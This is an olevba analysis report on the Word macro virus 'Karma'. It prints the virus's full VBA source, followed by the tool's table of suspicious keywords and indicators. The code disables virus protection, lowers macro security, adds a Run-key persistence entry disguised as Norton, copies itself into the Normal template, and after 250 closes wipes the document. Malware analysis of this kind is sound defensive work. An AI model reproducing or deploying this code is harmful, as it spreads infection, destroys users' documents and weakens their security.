olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Karma
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Karma - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
On Error Resume Next

    If ActiveDocument.Name = "Document1" Then Exit Sub
    
    Set Nor = NormalTemplate.VBProject.VBComponents(1).CodeModule
    Set Doc = ActiveDocument.VBProject.VBComponents(1).CodeModule

    With Options
        .VirusProtection = False
        .ConfirmConversions = False
        .SaveNormalPrompt = False
    End With

    Application.DisplayStatusBar = False

    System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
    System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run", "Norton Auto-Protect") = "C:\Windows\Backup.vbs"

    Open "C:\Windows\Karma.drv" For Output As #1
    Print #1, VBProject.VBComponents(1).CodeModule.Lines(1, 85)
    Close #1
    SetAttr ("C:\Windows\Karma.drv"), 6

    Nor.DeleteLines 1, Nor.CountOfLines: Nor.AddFromFile ("C:\Windows\Karma.drv")
    Doc.DeleteLines 1, Doc.CountOfLines: Doc.AddFromFile ("C:\Windows\Karma.drv")

   
    
End Sub

Private Sub Document_Close()
    On Error Resume Next
    sFileName = Environ("Windir")
    If Right(sFileName, 1) <> "\" Then
    sFileName = sFileName & "\"
    End If
    
    sFileName = sFileName & "WIN.INI"

    sCounter = System.PrivateProfileString(sFileName, ActiveDocument.FullName, "Counter")
    sCounter = Val(sCounter) + 1
    System.PrivateProfileString(sFileName, ActiveDocument.FullName, "Counter") = sCounter
    If Val(sCounter) > "250" Then
        Selection.WholeStory
        Selection.Delete Unit:=wdCharacter, Count:=1
        Set myRange = ActiveDocument.Paragraphs(1).Range
            With myRange.Font
                .Bold = True
                .Name = "Space Woozies"
                .Size = 100
            End With
        Selection.TypeText "This Document has expired due to Bad Karma"
    End If
    If ActiveDocument.Saved = False Then ActiveDocument.Save
End Sub


+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Environ             |May read system environment variables        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Backup.vbs          |Executable file name                         |
+----------+--------------------+---------------------------------------------+

